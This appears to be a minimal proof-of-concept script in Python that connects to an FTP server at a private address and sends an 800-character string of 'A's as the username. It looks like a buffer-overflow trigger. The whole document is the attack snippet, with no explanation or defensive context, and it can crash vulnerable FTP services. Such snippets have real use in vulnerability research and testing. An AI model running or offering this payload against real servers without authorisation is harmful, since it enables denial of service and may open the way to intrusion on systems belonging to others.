import ftplib
buffer="A" * 800
ftp = ftplib.FTP('192.168.0.100', buffer, 'test')
